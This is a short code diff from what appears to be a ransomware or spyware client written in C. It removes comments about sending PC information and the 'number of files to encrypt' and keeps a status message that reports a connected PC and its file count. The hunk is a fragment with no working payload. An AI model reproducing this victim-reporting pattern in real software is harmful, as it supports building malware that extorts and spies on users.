@@ -108,9 +108,6 @@ int startclient() {
         return -1;
     }
 
-    //Todo send information about pc, number of files to encrypt
-    //Spyware
-
     char* hey = "PC connected, number of file : ";
 
     struct utsname name;
